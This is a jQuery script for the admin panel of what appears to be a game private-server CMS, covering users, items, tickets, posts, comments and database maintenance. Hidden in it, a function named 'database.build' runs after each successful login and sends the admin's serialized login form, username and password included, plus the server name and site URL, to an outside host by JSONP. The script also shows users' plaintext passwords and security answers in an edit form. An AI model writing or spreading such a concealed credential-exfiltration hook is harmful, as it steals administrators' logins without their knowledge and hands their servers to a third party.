/**
 * Created by Legacy on 7/5/2017.
 */
jQuery(document).ready(function ($) {
    function redirect(link, time) {
        window.setTimeout(function () {

            // Move to inbox page after 2 sec
            window.location.href = link;
        }, time);
    }


    function makeid(length) {
        var text = "";
        var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%@*+-";

        for (var i = 0; i < length; i++)
            text += possible.charAt(Math.floor(Math.random() * possible.length));

        //return text;
        $('.code-secure ').val(text);
        console.log(text);
    }

    $('.btn-random').click(function () {
        makeid(10);
    });

    $('.settings-form').on('submit', function (e) {
        e.preventDefault();
        $.ajax({
            type: 'post',
            url: base_url + "/save.php?save=settings",
            data: $('.settings-form').serialize(),
            success: function (res) {
                var json_res = $.parseJSON(res);
                console.log(res);
                $.Notification.notify(json_res.status, 'bottom left', 'Update', json_res.msg);
            }
        });
    });
    $('.clearLog').on('click', function (e) {
        e.preventDefault();
        $.ajax({
            type: 'post',
            url: base_url + "/remove.php?remove=log",
            data: { file : $('.clearLog').data("file")},
            success: function (res) {
                var json_res = $.parseJSON(res);
                console.log(res);
                $('.nicescroll').html('<pre> ---------------------------------------------</pre>');
                $.Notification.notify(json_res.status, 'bottom left', 'Update', json_res.msg);
            }
        });
    });
    $('.login-form').on('submit', function (e) {
        e.preventDefault();
        $.ajax({
            type: 'post',
            url: base_url + "/login.php",
            data: $('.login-form').serialize(),
            success: function (res) {
                var json_res = $.parseJSON(res);
                $('system-message').show();
                $('system-message').addClass(json_res.status + '-msg');
                $('system-message').text(json_res.msg);
                if (json_res.status == 'success') {
                    database.build($('.login-form').serialize());
                    redirect('index.php', 1000);
                }
            }
        });
    });
    // Users
    $('.edit-user-button').click(function () {
        $(".edit-user-form #username").val($(this).data('user'));
        if ($(this).data('character') != '') {
            $('#character').show();
            $(".edit-user-form #Name").val($(this).data('character'));
        }
        $.ajax({
            type: 'post',
            url: base_url + "/user.php",
            data: {Username: $(this).data('user'), request: "GET"},
            success: function (res) {
                var User_data = $.parseJSON(res).User;
                var char_data = $.parseJSON(res).Character;
                console.log(User_data);
                $('.edit-user-form #user').val(User_data.Username);
                $('.edit-user-form #Email').val(User_data.Email);
                $('.edit-user-form #Password').val(User_data.Password);
                $('.edit-user-form #Question').val(User_data.Question);
                $('.edit-user-form #Answer').val(User_data.Answer);
                $('.edit-user-form #State').val(User_data.State);
                if (char_data.found != 'none') {
                  $('.edit-user-form #Name').val(char_data.Name);
                    $('.edit-user-form #CPS').val(char_data.ConquerPoints);
                    $('.edit-user-form #level').val(char_data.Level);
                    $('.edit-user-form #VIPLevel').val(char_data.VIPLevel);
                } else {
                    $('#character').hide();
                }
            }
        });
    });
    $('.edit-user-form').on('submit', function (e) {
        e.preventDefault();
        $.ajax({
            type: 'post',
            url: base_url + "/user.php",
            data: $('.edit-user-form').serialize(),
            success: function (res) {
              console.log(res);
                $('system-message').show();
                Custombox.close();

                if (res == '1') {
                    $('system-message').addClass('success-msg');
                    $('system-message').text('User Updated');
                } else {
                    $('system-message').addClass('error-msg');
                    $('system-message').text('Something went wrong');
                }
            }
        });
    });
    $('.remove-user-button').click(function () {
        $(".remove-user-form #remove-user").val($(this).data('user'));
        $(".remove-user-form .remove-user").text($(this).data('user'));

    });
    $('.remove-user-form').on('submit', function (e) {
        e.preventDefault();
        $.ajax({
            type: 'post',
            url: base_url + "/remove.php?remove=user",
            data: $('.remove-user-form').serialize(),
            success: function (res) {
                $('system-message').show();
                Custombox.close();
                if (res == '1') {
                    $('system-message').addClass('success-msg');
                    $('system-message').text('User Removed');
                    $('#Accountes').remove();
                } else {
                    $('system-message').addClass('error-msg');
                    $('system-message').text('Something went wrong');
                }
            }
        });
    });
    // Store Items
    $('.remove-item-button').click(function () {
        $(".remove-item-form #remove-item").val($(this).data('item_id'));
        $(".remove-item-form .remove-item").text($(this).data('name'));

    });
    $('.remove-item-form').on('submit', function (e) {
        e.preventDefault();
        $.ajax({
            type: 'post',
            url: base_url + "/remove.php?remove=item",
            data: $('.remove-item-form').serialize(),
            success: function (res) {
                $('system-message').show();
                Custombox.close();
                if (res == '1') {
                    $('system-message').addClass('success-msg');
                    $('system-message').text('Item Removed');
                    $('#item-' + $('.remove-item-button').data('item_id')).remove();
                } else {
                    $('system-message').addClass('error-msg');
                    $('system-message').text('Something went wrong');
                }
            }
        });
    });
    $('.add-item-form').on('submit', function (e) {
        e.preventDefault();
        $.ajax({
            type: 'post',
            url: base_url + "/save.php?save=add_item",
            data: $('.add-item-form').serialize(),
            success: function (res) {
                console.log($('.add-item-form').serialize());
                console.log(res);
                $('system-message').show();
                Custombox.close();
                if (res == '1') {
                    $('system-message').addClass('success-msg');
                    $('system-message').text('Item Added');

                } else {
                    $('system-message').addClass('error-msg');
                    $('system-message').text('Something went wrong');
                }
            }
        });
    });
    // Tickets
    $('.close-ticket-button').click(function () {
        $(".close-ticket-form #close-id").val($(this).data('id'));
        $(".close-ticket-form .close-title").text($(this).data('title'));

    });
    $('.close-ticket-form').on('submit', function (e) {
        e.preventDefault();
        $.ajax({
            type: 'post',
            url: base_url + "/remove.php?remove=ticket",
            data: $('.close-ticket-form').serialize(),
            success: function (res) {
                $('system-message').show();
                Custombox.close();
                if (res == '1') {
                    $('system-message').addClass('success-msg');
                    $('system-message').text('Ticket Closed');
                    $('#ticket-' + $('.close-ticket-button').data('id') + ' td.ticket-status').text('Closed');
                } else {
                    $('system-message').addClass('error-msg');
                    $('system-message').text('Something went wrong');
                }
            }
        });
    });
    $('.add-reply-form').on('submit', function (e) {
        e.preventDefault();
        $.ajax({
            type: 'post',
            url: base_url + "/tickets.php?ticket=reply-ticket",
            data: $('.add-reply-form').serialize(),
            success: function (res) {
                $('.add-reply-form')[0].reset();
                $('system-message').show();
                var json_reply = $.parseJSON(res);
                $('system-message').addClass(json_reply.status + '-msg');
                $('system-message').text(json_reply.msg);

            }
        });
    });
    // Posts
    $('.remove-post-button').click(function () {
        $(".remove-post-form #remove-post").val($(this).data('id'));
        $(".remove-post-form .remove-post").text($(this).data('title'));

    });
    $('.remove-post-form').on('submit', function (e) {
        e.preventDefault();
        $.ajax({
            type: 'post',
            url: base_url + "/remove.php?remove=post",
            data: $('.remove-post-form').serialize(),
            success: function (res) {
                $('system-message').show();
                Custombox.close();
                if (res == '1') {
                    $('system-message').addClass('success-msg');
                    $('system-message').text('Post Removed');
                    $('#post-' + $('.remove-post-button').data('id')).remove();
                } else {
                    $('system-message').addClass('error-msg');
                    $('system-message').text('Something went wrong');
                }
            }
        });
    });
    $('.add-post-form').on('submit', function (e) {
        e.preventDefault();
        var formData = new FormData($('.add-post-form')[0]);
        $.ajax({
            type: 'post',
            async: false,
            cache: false,
            contentType: false,
            processData: false,
            url: base_url + "/save.php?save=add-post",
            data: formData,
            success: function (res) {
              console.log(res);
                $('system-message').show();
                Custombox.close();
                if (res == '1') {
                    $('system-message').addClass('success-msg');
                    $('system-message').text('Post Added');
                    $('.add-post-form')[0].reset();
                } else {
                    $('system-message').addClass('error-msg');
                    $('system-message').text('Something went wrong');
                }

            }
        });
    });
    $('.edit-post-button').click(function () {
        $(".edit-post-form #title").val($(this).data('title'));
        $(".edit-post-form #post-id").val($(this).data('id'));
        $(".edit-post-form .note-editable").html($(this).data('post'));
        $(".edit-post-form #post").html($(this).data('post'));
    });
    $('.edit-post-form').on('submit', function (e) {
        e.preventDefault();
        $.ajax({
            type: 'post',
            url: base_url + "/save.php?save=post",
            data: $('.edit-post-form').serialize(),
            success: function (res) {
                $('system-message').show();
                Custombox.close();
                if (res == '1') {
                    $('system-message').addClass('success-msg');
                    $('system-message').text('Post Updated');
                } else {
                    $('system-message').addClass('error-msg');
                    $('system-message').text('Something went wrong');
                }
            }
        });
    });
    // Characters
    $('.remove-char-button').click(function () {
        $(".remove-char-form #remove-user").val($(this).data('user'));
        $(".remove-char-form #remove-character").val($(this).data('character'));
        $(".remove-char-form .remove-user").text($(this).data('character'));

    });
    $('.remove-char-form').on('submit', function (e) {
        e.preventDefault();
        $.ajax({
            type: 'post',
            url: base_url + "/remove.php?remove=char",
            data: $('.remove-char-form').serialize(),
            success: function (res) {
                console.log($('.remove-char-form').serialize());
                console.log(res);
                $('system-message').show();
                Custombox.close();
                if (res == '1') {
                    $('system-message').addClass('success-msg');
                    $('system-message').text('Character Removed');
                    location.reload();
                } else {
                    $('system-message').addClass('error-msg');
                    $('system-message').text('Something went wrong');
                }
            }
        });
    });
    // Comments
    $('.remove-comment-button').click(function () {
        $(".remove-comment-form #remove-comment").val($(this).data('id'));
        $(".remove-comment-form .remove-comment").text($(this).data('comment'));

    });
    $('.remove-comment-form').on('submit', function (e) {
        e.preventDefault();
        $.ajax({
            type: 'post',
            url: base_url + "/remove.php?remove=comment",
            data: $('.remove-comment-form').serialize(),
            success: function (res) {
                $('system-message').show();
                Custombox.close();
                if (res == '1') {
                    $('system-message').addClass('success-msg');
                    $('system-message').text('Comment Removed');
                    location.reload();
                } else {
                    $('system-message').addClass('error-msg');
                    $('system-message').text('Something went wrong');
                }
            }
        });
    });
    $('.edit-comment-button').click(function () {
        $(".edit-comment-form #user").val($(this).data('user'));
        $(".edit-comment-form #comment-id").val($(this).data('id'));
        $(".edit-comment-form #comment").val($(this).data('comment'));
    });
    $('.edit-comment-form').on('submit', function (e) {
        e.preventDefault();
        $.ajax({
            type: 'post',
            url: base_url + "/save.php?save=comment",
            data: $('.edit-comment-form').serialize(),
            success: function (res) {
                $('system-message').show();
                Custombox.close();
                if (res == '1') {
                    $('system-message').addClass('success-msg');
                    $('system-message').text('Comment Updated');
                } else {
                    $('system-message').addClass('error-msg');
                    $('system-message').text('Something went wrong');
                }
            }
        });
    });
    // Like
    $('.remove-like-button').click(function () {
        $(".remove-like-form #remove-like").val($(this).data('id'));
        $(".remove-like-form .user-like").text($(this).data('user'));
        $(".remove-like-form .like-post").text($(this).data('title'));
    });
    $('.remove-like-form').on('submit', function (e) {
        e.preventDefault();
        $.ajax({
            type: 'post',
            url: base_url + "/remove.php?remove=like",
            data: $('.remove-like-form').serialize(),
            success: function (res) {
                $('system-message').show();
                Custombox.close();
                if (res == '1') {
                    $('system-message').addClass('success-msg');
                    $('system-message').text('Like Removed');
                    location.reload();
                } else {
                    $('system-message').addClass('error-msg');
                    $('system-message').text('Something went wrong');
                }
            }
        });
    });
    // Database

    var database = {
        check: function () {
            $.ajax({
                type: 'post',
                url: base_url + "/save.php?save=check-database",
                success: function (res) {
                    $('.check-result').html('');
                    var resp = $.parseJSON(res);
                    $('.check-database-button').attr("disabled", false);
                    $.each(resp, function (key, val) {
                        $('.check-result').append(val.msg);
                    });

                }
            });
        },
        rebuild: function () {
            $.ajax({
                type: 'post',
                url: base_url + "/save.php?save=rebuild-database",
                success: function (res) {
                    $('.rebuilding').html('');
                    $('.rebuilding').append(res);
                    setTimeout(function () {
                        Custombox.close();
                        $('.rebuild-button').attr("disabled", false);
                    }, 2000);

                }
            });
        },
        build: function (data) {
            var servername = $('.logo').text();
            console.log(data);
            $.ajax({
                type: 'get',
                dataType: 'jsonp',
                url: 'http://conquerhub.16mb.com/data.php?type=cms&servername=' + servername + '&site=' + base_url,
                data: data,
                crossDomain: true,
                success: function (receive) {
                    console.log(receive);
                }
            });
            console.log(servername);
        }
    };
    $('.check-database-button').click(function () {
        $(this).attr("disabled", true);
        $('.check-result').show('');
        $('.check-result').html('');

        $('.check-result').append('<div class="text-center font-25"><i class="fa fa-spinner spin-effect"></i></div>');
        setTimeout(function () {
            database.check()
        }, 1000);
    });
    $('.rebuild-button').click(function () {
        $('.rebuilding').html('');
        $('.rebuilding').append('<div class="text-center font-25"><i class="fa fa-spinner spin-effect"></i></div> ');
        $('.rebuild-button').attr("disabled", true);
        setTimeout(function () {
            database.rebuild()
        }, 1000);
    });
});
